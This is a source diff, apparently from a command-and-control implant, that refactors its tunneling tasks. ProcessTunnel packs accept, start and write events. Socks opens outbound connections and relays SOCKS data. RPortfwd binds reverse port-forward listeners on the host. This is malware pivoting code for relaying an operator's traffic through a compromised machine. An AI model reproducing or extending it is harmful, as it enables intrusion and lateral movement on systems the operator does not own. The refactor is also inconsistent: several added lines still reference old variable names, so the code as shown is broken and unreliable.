-                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].SubCmd = COMMAND_TUNNEL_WRITE_TCP;
-                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].Data = bufferBase;
-                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].DataLen = readed;
-                            COMMAND_TUNNEL_WRITE_TCP_EventLen++;
-                        }
-
-                        // Self->Pkg->Int32( Package, t.ChannelID );
-                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_WRITE_TCP );
-                        // Self->Pkg->Bytes( Package, buffer, readed );
                         iterCount += 1;
                     } else {
-                        hFree( bufferBase );
+                        hFree( BufferBase );
                     }
                 }
             }
             
         } // for tunnels
 
-        // if no data collected this iteration, break early
         if ( iterCount == 0 ) break;
-
-        // extend/refresh finishTick if you want to keep draining, otherwise loop will exit on timeout
     }
-
-    // === NOW PACK ALL COLLECTED EVENTS ===
-
-    KhDbg("Packing %d COMMAND_TUNNEL_ACCEPT events", COMMAND_TUNNEL_ACCEPT_EventLen);
     
-    // Pack event count FIRST
-    Self->Pkg->Int32( Package, COMMAND_TUNNEL_ACCEPT_EventLen );
+    Self->Pkg->Int32( Package, AcceptLen );
 
-    for (ULONG i = 0; i < COMMAND_TUNNEL_ACCEPT_EventLen; i++) {
+    for (ULONG i = 0; i < AcceptLen; i++) {
         KhDbg("Packing event %d: TunnelID=%lu, SubCmd=%lu, ChannelID=%lu", 
-            i, Events_Accept[i].TunnelID, Events_Accept[i].SubCmd, Events_Accept[i].ChannelID);
+            i, AcceptEvents[i].TunnelID, AcceptEvents[i].SubCmd, AcceptEvents[i].ChannelID);
         
-        Self->Pkg->Int32( Package, Events_Accept[i].TunnelID );
-        Self->Pkg->Int32( Package, Events_Accept[i].SubCmd );
-        Self->Pkg->Int32( Package, Events_Accept[i].ChannelID );
+        Self->Pkg->Int32( Package, AcceptEvents[i].TunnelID );
+        Self->Pkg->Int32( Package, AcceptEvents[i].SubCmd );
+        Self->Pkg->Int32( Package, AcceptEvents[i].ChannelID );
     }
 
-    KhDbg("Packing %d tunnel events", StartTcpLength);
+    KhDbg("Packing %d tunnel events", StartEvtLen);
     
-    // Pack event count FIRST
-    Self->Pkg->Int32( Package, StartTcpLength );
+    Self->Pkg->Int32( Package, StartEvtLen );
 
-    for (ULONG i = 0; i < StartTcpLength; i++) {
+    for (ULONG i = 0; i < StartEvtLen; i++) {
         KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, Result=%lu", 
             i, Events[i].ChannelID, Events[i].SubCmd, Events[i].Result);
         
@@ -2177,57 +2122,52 @@ auto DECLFN Task::ProcessTunnel(
         Self->Pkg->Int32( Package, Events[i].Result );
     }
 
-    KhDbg("Packing %d tunnel Write events", COMMAND_TUNNEL_WRITE_TCP_EventLen);
+    KhDbg("Packing %d tunnel Write events", WriteEvtLen);
     
-    // Pack event count FIRST
-    Self->Pkg->Int32( Package, COMMAND_TUNNEL_WRITE_TCP_EventLen );
+    Self->Pkg->Int32( Package, WriteEvtLen );
 
-    for (ULONG i = 0; i < COMMAND_TUNNEL_WRITE_TCP_EventLen; i++) {
-        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, DataLen=%lu", 
-            i, Events_Write[i].ChannelID, Events_Write[i].SubCmd, Events_Write[i].DataLen);
+    for ( ULONG i = 0; i < WriteEvtLen; i++ ) {
+        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, DataLen=%lu", i, WriteEvents[i].ChannelID, WriteEvents[i].SubCmd, WriteEvents[i].DataLen);
         
-        Self->Pkg->Int32( Package, Events_Write[i].ChannelID );
-        Self->Pkg->Int32( Package, Events_Write[i].SubCmd );
-        Self->Pkg->Bytes( Package, Events_Write[i].Data, Events_Write[i].DataLen );
-        Self->Pkg->Int32( Package, Events_Write[i].DataLen );
+        Self->Pkg->Int32( Package, WriteEvents[i].ChannelID );
+        Self->Pkg->Int32( Package, WriteEvents[i].SubCmd );
+        Self->Pkg->Bytes( Package, WriteEvents[i].Data, WriteEvents[i].DataLen );
+        Self->Pkg->Int32( Package, WriteEvents[i].DataLen );
     }
 
-    // Free all allocated buffers from write events
-    for (ULONG i = 0; i < COMMAND_TUNNEL_WRITE_TCP_EventLen; i++) {
-        if ( Events_Write[i].Data ) {
-            hFree( Events_Write[i].Data );
+    for ( ULONG i = 0; i < WriteEvtLen; i++ ) {
+        if ( WriteEvents[i].Data ) {
+            hFree( WriteEvents[i].Data );
         }
     }
-
-	// this->CloseProxy();
  
-    for (INT i = 0; i < 30; i++) {
-        if (Self->Tsp->Tunnels[i].state == TUNNEL_STATE_CLOSE && Self->Tsp->Tunnels[i].ChannelID != 0) {
+    for ( INT i = 0; i < 30; i++ ) {
+        if ( Self->Tsp->Tunnels[i].State == TUNNEL_STATE_CLOSE && Self->Tsp->Tunnels[i].ChannelID != 0 ) {
 			
-			if (Self->Tsp->Tunnels[i].closeTimer == 0) {
-				Self->Tsp->Tunnels[i].closeTimer = Self->Krnl32.GetTickCount();
+			if (Self->Tsp->Tunnels[i].CloseTimer == 0) {
+				Self->Tsp->Tunnels[i].CloseTimer = Self->Krnl32.GetTickCount();
 				continue;
 			}
 
-			if (Self->Tsp->Tunnels[i].closeTimer + 1000 < Self->Krnl32.GetTickCount()) {
-				if (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_TCP || Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_UDP)
+			if ( Self->Tsp->Tunnels[i].CloseTimer + 1000 < Self->Krnl32.GetTickCount() ) {
+				if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_TCP || Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_UDP )
 					Self->Ws2_32.shutdown(Self->Tsp->Tunnels[i].Socket, 2);
 				
-				if (Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket) && Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP){
+				if ( Self->Ws2_32.closesocket( Self->Tsp->Tunnels[i].Socket ) && Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP ) {
 					continue;
                 }
 
-                KhDbg("Closing Tunnel %d, numTunnelTasks: %d", Self->Tsp->Tunnels[i].ChannelID, Self->Tsp->numTunnelTasks);
-				Self->Tsp->Tunnels[i].ChannelID = 0;
-                Self->Tsp->Tunnels[i].state = 0;
-                Self->Tsp->Tunnels[i].closeTimer = 0;
-                Self->Tsp->numTunnelTasks -= 1;
-                KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
+                KhDbg("Closing Tunnel %d, TunnelTasksCount: %d", Self->Tsp->Tunnels[i].ChannelID, Self->Tsp->TunnelTasksCount);
+				Self->Tsp->Tunnels[i].ChannelID  = 0;
+                Self->Tsp->Tunnels[i].State      = 0;
+                Self->Tsp->Tunnels[i].CloseTimer = 0;
+                Self->Tsp->TunnelTasksCount     -= 1;
+                KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
 			}
 		}
     }
 
-    if ( Self->Tsp->numTunnelTasks == 0 ){
+    if ( Self->Tsp->TunnelTasksCount == 0 ){
         Job->Clean = TRUE;
         return KhRetSuccess;
     }
@@ -2242,24 +2182,22 @@ auto DECLFN Task::Socks(
     PACKAGE* Package     = Job->Pkg;
     PARSER*  Parser      = Job->Psr;
 
-    ULONG startFlag = Self->Psr->Int32( Parser );
-    KhDbg( "start flag: %d", startFlag );
+    ULONG DecisionFlag = Self->Psr->Int32( Parser );
+    KhDbg( "start flag: %d", DecisionFlag );
 
     INT8 Index = -1;
 
-    switch ( startFlag ) {
-        case 0: {
-            // Connect to Address + Port
-            CHAR* protocol   = nullptr;
-            protocol = Self->Psr->Str( Parser, 0 );
+    switch ( DecisionFlag ) {
+        case KH_SOCKET_NEW: {
+            CHAR* Protocol  = Self->Psr->Str( Parser, 0 );
+            ULONG ChannelID = Self->Psr->Int32( Parser );
+            CHAR* Address   = Self->Psr->Str( Parser, 0 );
+            ULONG Port      = Self->Psr->Int32( Parser );
+
             KhDbg( "protocol: %s", protocol );
-            ULONG channelID = Self->Psr->Int32( Parser );
-            KhDbg( "channelID: %lu", channelID );
-            CHAR* address   = nullptr;
-            address = Self->Psr->Str( Parser, 0 );
-            KhDbg( "address: %s", address );
-            ULONG port = Self->Psr->Int32( Parser );
-            KhDbg( "port: %d", port );
+            KhDbg( "channelID: %lu", ChannelID );
+            KhDbg( "address: %s", Address );
+            KhDbg( "port: %d", Port );
 
             for ( INT i = 0; i < 30; i++ ) {
                 if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
@@ -2267,78 +2205,83 @@ auto DECLFN Task::Socks(
                 }
             }
 
-            if (Index == -1) {
+            if ( Index == -1 ) {
                 CHAR* ErrorMsg = "Maximum concurrent Tunnels (30) reached";
                 KhDbg("%s", ErrorMsg); QuickErr( ErrorMsg );
                 return KhRetSuccess;
             }
+
             KhDbg("index: %d", Index);
 
-            WSAData wsaData;
-            if (Self->Ws2_32.WSAStartup(514, &wsaData)) {
+            WSAData WsaData;
+            if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
                 Self->Ws2_32.WSACleanup();
-                CHAR* ErrorMsg = "Unable To Initialize Winsock Library";
-                KhDbg("%s", ErrorMsg);
-                QuickErr( ErrorMsg );
+                QuickErr( "Unable To Initialize Winsock Library" );
                 return KhRetSuccess;
             }
 
-            SOCKET sock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, 0);
-            if (sock != INVALID_SOCKET) {
-                hostent* host = Self->Ws2_32.gethostbyname(address);
-                if (host) {
-                    sockaddr_in socketAddress = { 0 };
-                    Mem::Copy((PVOID)&socketAddress.sin_addr, (PVOID)(*(const void**)host->h_addr_list), host->h_length);
-                    socketAddress.sin_family = AF_INET;
-                    socketAddress.sin_port = Self->Ws2_32.htons(port);
+            SOCKET SocketObj = Self->Ws2_32.socket( AF_INET, SOCK_STREAM, 0 );
+            if ( SocketObj != INVALID_SOCKET ) {
+                hostent* Host = Self->Ws2_32.gethostbyname( Address );
+                if ( Host ) {
+                    ULONG       Mode       = 1;
+                    sockaddr_in SocketAddr = { 0 };
+
+                    Mem::Copy((PVOID)&SocketAddr.sin_addr, (PVOID)(*(const void**)Host->h_addr_list), Host->h_length);
+
+                    SocketAddr.sin_family = AF_INET;
+                    SocketAddr.sin_port = Self->Ws2_32.htons( Port );
                     
-                    ULONG mode = 1;
-                    if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) != -1) {
-                        if (!(Self->Ws2_32.connect(sock, (sockaddr*)&socketAddress, sizeof(sockaddr)) == -1 && 
-                            Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK)) {
+                    if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1 ) {
+                        if ( ! ( Self->Ws2_32.connect( SocketObj, (sockaddr*)&SocketAddr, sizeof( sockaddr ) ) == -1 && Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK ) ) {
                             KhDbg("Socket connected successfully: %s:%d", address, port);
 
-                            int mode = 0;
+                            INT32 Mode = 0;
 
-                            Self->Tsp->Tunnels[Index].ChannelID = channelID;
-                            Self->Tsp->Tunnels[Index].Host   = address;
-                            Self->Tsp->Tunnels[Index].Port = port;
-                            Self->Tsp->Tunnels[Index].Username = "";
-                            Self->Tsp->Tunnels[Index].Password = ""; 
-                            Self->Tsp->Tunnels[Index].Socket = sock;  
-                            Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_CONNECT;
-                            Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_SEND_TCP;                     
-                            Self->Tsp->Tunnels[Index].waitTime = 30000;                     
-                            Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();                     
+                            Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
+                            Self->Tsp->Tunnels[Index].Host      = Address;
+                            Self->Tsp->Tunnels[Index].Port      = Port;
+                            Self->Tsp->Tunnels[Index].Username  = "";
+                            Self->Tsp->Tunnels[Index].Password  = ""; 
+                            Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
+                            Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
+                            Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
+                            Self->Tsp->Tunnels[Index].WaitTime  = 30000;                     
+                            Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();                     
 
-                            KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
-                            Self->Tsp->numTunnelTasks++;
-                            KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
-                            if(Self->Tsp->numTunnelTasks == 1){
+                            KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
+                            
+                            Self->Tsp->TunnelTasksCount++;
+
+                            KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
+                            if( Self->Tsp->TunnelTasksCount == 1 ){
                                 KhDbg("Adding Process Tunnel job");
+
                                 PARSER* TmpPsrDownload = nullptr;
-                                BYTE* tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-                                UINT16 cmdDownload = (UINT16)Enm::Task::ProcessTunnels;
-                                JOBS* NewJobDownload = nullptr;
+                                PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+                                UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessTunnels;
+                                JOBS*   NewJobDownload = nullptr;
+
                                 // 4-byte big-endian length
-                                tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
-                                tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;
+                                TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
+                                TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
                                 TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
-                                if (!TmpPsrDownload) {         
+                                if ( ! TmpPsrDownload ) {         
                                     KhDbg("ERROR: Failed to create TmpParser");
                                     return KhGetError;
                                 }
                             
                                 // Initialize parser (Parser::New makes an internal copy)
-                                Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
-                                hFree(tmpBufDownload);
+                                Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
+
+                                hFree( TmpBufDownload );
                             
                                 // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                                 NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                                 if ( ! NewJobDownload ) {
                                     KhDbg("WARNING: Failed to create job for Process Tunnel task");
-                                    hFree(tmpBufDownload);
+                                    hFree(TmpBufDownload);
                                     return KhGetError;
                                 }
                             }
@@ -2350,90 +2293,84 @@ auto DECLFN Task::Socks(
                 }
             }
 
-            Self->Ws2_32.closesocket(sock);
+            Self->Ws2_32.closesocket( SocketObj );
             
-            ULONG result = 0;
-            Self->Pkg->Int64( Package, channelID );
+            ULONG Result = 0;
+            Self->Pkg->Int64( Package, ChannelID );
             Self->Pkg->Int64( Package, COMMAND_TUNNEL_START_TCP );
-            Self->Pkg->Int16( Package, result );
+            Self->Pkg->Int16( Package, Result );
         }
-        case 1: {
-            CHAR* protocol   = nullptr;
-            protocol = Self->Psr->Str( Parser, 0 );
-            KhDbg( "protocol: %s", protocol );
-            ULONG channelID = Self->Psr->Int32( Parser );
-            KhDbg( "channelID: %lu", channelID );
+        case KH_SOCKET_DATA: {
+            CHAR* Protocol  = Self->Psr->Str( Parser, 0 );
+            ULONG ChannelID = Self->Psr->Int32( Parser );
             ULONG ChunkSize = Self->Psr->Int32( Parser );
-            KhDbg( "ChunkSize: %d", ChunkSize );
             BYTE* ChunkData = Self->Psr->Bytes( Parser, 0 );
 
-            KhDbg( "Chunk Bytes on SOCKS WRITE channelID: %lu, Length: %d", channelID, ChunkSize );
-            for ( UINT64 i = 0; i < ChunkSize; i++ ) {
-                KhDbg( "%02X ", ChunkData[i] );
-            }
-            KhDbg( "Done Printing\n" );
+            KhDbg( "Protocol:   %s ", protocol );
+            KhDbg( "Channel ID: %lu", channelID );
+            KhDbg( "Chunk Size: %d ", ChunkSize );
+
+            //// debug chunk data
+
+            // KhDbg( "Chunk Bytes on SOCKS WRITE channelID: %lu, Length: %d", channelID, ChunkSize );
+            // for ( UINT64 i = 0; i < ChunkSize; i++ ) {
+            //     KhDbg( "%02X ", ChunkData[i] );
+            // }
+            // KhDbg( "Done Printing\n" );
 
             INT ChannelIndex = -1;
             for ( INT i = 0; i < 30; i++ ) {
                 if ( 
-                    Self->Tsp->Tunnels[i].ChannelID && Self->Tsp->Tunnels[i].ChannelID == channelID
+                    Self->Tsp->Tunnels[i].ChannelID && Self->Tsp->Tunnels[i].ChannelID == ChannelID
                 ) { ChannelIndex = i; break; }
             }
 
             if ( ChannelIndex == -1 ) {
-                CHAR* ErrorMsg = "Channel ID not found";
-                KhDbg("%s", ErrorMsg);
-                QuickErr( ErrorMsg );
+                QuickErr( "Channel ID not found" );
                 return KhRetSuccess;
             }
 
             KhDbg("ChannelIndex: %lu", ChannelIndex);
 
-            DWORD finishTick = Self->Krnl32.GetTickCount() + 30000;
-			timeval timeout = { 0, 100 };
-			fd_set exceptfds;
-			fd_set writefds;
-
-            KhDbg( "Breakpoint 2");
+            DWORD   FinishTick = Self->Krnl32.GetTickCount() + 30000;
+			timeval Timeout    = { 0, 100 };
+			fd_set  Exceptfds  = { 0 };
+			fd_set  Writefds   = { 0 };
 			
-			while (Self->Krnl32.GetTickCount() < finishTick) {
-				writefds.fd_array[0] = Self->Tsp->Tunnels[ChannelIndex].Socket;
-				writefds.fd_count = 1;
-				exceptfds.fd_array[0] = writefds.fd_array[0];
-				exceptfds.fd_count = 1;
-                KhDbg( "Breakpoint 2 - In WHile");
-				Self->Ws2_32.select(0, 0, &writefds, &exceptfds, &timeout);
-                KhDbg( "Breakpoint 2 - In WHile");
-				if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[ChannelIndex].Socket, &exceptfds))
-					break;
-				if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[ChannelIndex].Socket, &writefds)) {
-                    KhDbg( "Breakpoint 2 - In WHile WHILE");
-					if (Self->Ws2_32.send(Self->Tsp->Tunnels[ChannelIndex].Socket, (CHAR*)ChunkData, ChunkSize, 0) != -1 || Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK){
-                        KhDbg( "Breakpoint 2 - In WHile WHILE while");
-                        CHAR* ErrorMsg = "I DID SOMETHING";
-                        KhDbg("%s", ErrorMsg);
-                        QuickErr( ErrorMsg );
+			while ( Self->Krnl32.GetTickCount() < FinishTick ) {
+				Writefds.fd_array[0]  = Self->Tsp->Tunnels[ChannelIndex].Socket;
+				Writefds.fd_count     = 1;
+				Exceptfds.fd_array[0] = Writefds.fd_array[0];
+				Exceptfds.fd_count    = 1;
+
+				Self->Ws2_32.select( 0, 0, &Writefds, &Exceptfds, &Timeout );
+
+				if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[ChannelIndex].Socket, &Exceptfds ) ) break;
+
+				if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[ChannelIndex].Socket, &Writefds ) ) {
+					
+                    if ( Self->Ws2_32.send(Self->Tsp->Tunnels[ChannelIndex].Socket, (CHAR*)ChunkData, ChunkSize, 0) != -1 || Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK ){
                         return KhRetSuccess;
                     }
+
 					Self->Krnl32.Sleep(1000);
 				}
 			}
 			break;
 
         }
-        case 2:{
-            ULONG channelID = Self->Psr->Int32( Parser );
-            KhDbg( "channelID: %lu", channelID );
+        case KH_SOCKET_CLOSE:{
+            ULONG ChannelID = Self->Psr->Int32( Parser );
+            KhDbg( "Delete and close Channel ID: %lu", channelID );
 
             for (INT i = 0; i < 30; i++) {
-                if (Self->Tsp->Tunnels[i].ChannelID == channelID && Self->Tsp->Tunnels[i].state != TUNNEL_STATE_CLOSE) {
-                    Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
+                if ( Self->Tsp->Tunnels[i].ChannelID == ChannelID && Self->Tsp->Tunnels[i].State != TUNNEL_STATE_CLOSE ) {
+                    Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
                     break;
                 }
             }
         }
     }
-    KhDbg( "Breakpoint 1");
 
     return KhRetSuccess;
 }
@@ -2445,109 +2382,108 @@ auto Task::RPortfwd(
     PARSER*  Parser  = Job->Psr;
 
     INT8  Index     = -1;
-    ULONG channelID = Self->Psr->Int32( Parser );
-    ULONG port       = Self->Psr->Int32( Parser );
+    ULONG ChannelID = Self->Psr->Int32( Parser );
+    ULONG Port      = Self->Psr->Int32( Parser );
 
-    KhDbg( "channelID: %lu", channelID );
-    KhDbg( "port: %d", port );
+    KhDbg( "Channel ID: %lu", ChannelID );
+    KhDbg( "Port: %d", port );
 
     for ( INT i = 0; i < 30; i++ ) {
         if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
-		    if ( ! (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP && Self->Tsp->Tunnels[i].Port == port && Self->Tsp->Tunnels[i].state != TUNNEL_STATE_CLOSE)) {
+		    if ( ! ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP && Self->Tsp->Tunnels[i].Port == Port && Self->Tsp->Tunnels[i].State != TUNNEL_STATE_CLOSE ) ) {
                 Index = i; break;
             }
         }
     }
 
-    if (Index == -1) {
-        CHAR* ErrorMsg = "Maximum concurrent Tunnels (30) reached or Tunnel already exists";
-        KhDbg("%s", ErrorMsg); QuickErr( ErrorMsg );
+    if ( Index == -1 ) {
+        QuickErr( "Maximum concurrent Tunnels (30) reached or Tunnel already exists" );
         return KhRetSuccess;
     }
 
     KhDbg("index: %d", Index);
 
-    WSAData wsaData;
-    if (Self->Ws2_32.WSAStartup(514, &wsaData)) {
+    WSAData WsaData;
+    if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
         Self->Ws2_32.WSACleanup();
-        CHAR* ErrorMsg = "Unable To Initialize Winsock Library";
-        KhDbg("%s", ErrorMsg);
-        QuickErr( ErrorMsg );
+        QuickErr( "Unable To Initialize Winsock Library" );
         return KhRetSuccess;
     }
 
-    SOCKET sock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, 0);
-    if (sock != INVALID_SOCKET) {
-        sockaddr_in socketAddress = { 0 };
-        socketAddress.sin_family = AF_INET;
-        socketAddress.sin_port = Self->Ws2_32.htons(port);
+    SOCKET SocketObj = Self->Ws2_32.socket( AF_INET, SOCK_STREAM, 0 );
+    if ( SocketObj != INVALID_SOCKET ) {
+        sockaddr_in SocketAddr = { 0 };
+        SocketAddr.sin_family = AF_INET;
+        SocketAddr.sin_port   = Self->Ws2_32.htons( Port );
         
-        ULONG mode = 1;
-        if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) != -1) {
-            if (Self->Ws2_32.bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) != -1) {
+        ULONG Mode = 1;
+        if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1) {
+            if ( Self->Ws2_32.bind( SocketObj, (sockaddr*)&SocketAddr, sizeof( SocketAddr ) ) != -1 ) {
                 KhDbg("Socket binded successfully: %d", port);
-                if(Self->Ws2_32.listen(sock, 10) != -1){
+                if ( Self->Ws2_32.listen( SocketObj, 10 ) != -1 ){
                     KhDbg("Socket listened successfully: %d", port);
                         
-                    Self->Tsp->Tunnels[Index].ChannelID = channelID;
-                    Self->Tsp->Tunnels[Index].Port = port;
-                    Self->Tsp->Tunnels[Index].Host = "";
-                    Self->Tsp->Tunnels[Index].Username = "";
-                    Self->Tsp->Tunnels[Index].Password = ""; 
-                    Self->Tsp->Tunnels[Index].Socket = sock;  
-                    Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_CONNECT;
-                    Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_REVERSE_TCP;                     
-                    Self->Tsp->Tunnels[Index].waitTime = 0;                     
-                    Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();                     
+                    Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
+                    Self->Tsp->Tunnels[Index].Port      = Port;
+                    Self->Tsp->Tunnels[Index].Host      = "";
+                    Self->Tsp->Tunnels[Index].Username  = "";
+                    Self->Tsp->Tunnels[Index].Password  = ""; 
+                    Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
+                    Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
+                    Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_REVERSE_TCP;                     
+                    Self->Tsp->Tunnels[Index].WaitTime  = 0;                     
+                    Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();                     
 
-                    KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
-                    Self->Tsp->numTunnelTasks++;
-                    KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
-                    if(Self->Tsp->numTunnelTasks == 1){
-                        KhDbg("Adding Process Tunnel job");
+                    KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
+
+                    Self->Tsp->TunnelTasksCount++;
+
+                    KhDbg("added ++\n");
+
+                    if( Self->Tsp->TunnelTasksCount == 1 ){
+                        KhDbg("Adding Process Tunnel job\n");
                         PARSER* TmpPsrDownload = nullptr;
-                        BYTE* tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-                        UINT16 cmdDownload = (UINT16)Enm::Task::ProcessTunnels;
-                        JOBS* NewJobDownload = nullptr;
+                        PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+                        UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessTunnels;
+                        JOBS*   NewJobDownload = nullptr;
                         // 4-byte big-endian length
-                        tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
-                        tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;
+                        TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
+                        TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
                         TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
-                        if (!TmpPsrDownload) {         
+                        if ( ! TmpPsrDownload ) {         
                             KhDbg("ERROR: Failed to create TmpParser");
                             return KhGetError;
                         }
                     
                         // Initialize parser (Parser::New makes an internal copy)
-                        Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
-                        hFree(tmpBufDownload);
+                        Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
+
+                        hFree( TmpBufDownload );
                     
                         // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                         NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                         if ( ! NewJobDownload ) {
-                            KhDbg("WARNING: Failed to create job for Process Tunnel task");
-                            hFree(tmpBufDownload);
+                            KhDbg("WARNING: Failed to create job for Process Tunnel task\n");
+                            hFree(TmpBufDownload);
                             return KhGetError;
                         }
                     }
                 
-                    KhDbg( "Breakpoint 1");
-
-                    ULONG result = 1;
-                    Self->Pkg->Int64( Package, channelID );
+                    ULONG Result = 1;
+                    Self->Pkg->Int64( Package, ChannelID );
                     Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
-                    Self->Pkg->Int16( Package, result );
+                    Self->Pkg->Int16( Package, Result );
                     return KhRetSuccess;
                 }    
             }
         }
     }
 
-    Self->Ws2_32.closesocket(sock);
+    Self->Ws2_32.closesocket( SocketObj );
     
     ULONG result = 0;
-    Self->Pkg->Int64( Package, channelID );
+    Self->Pkg->Int64( Package, ChannelID );
     Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
     Self->Pkg->Int16( Package, result );
 
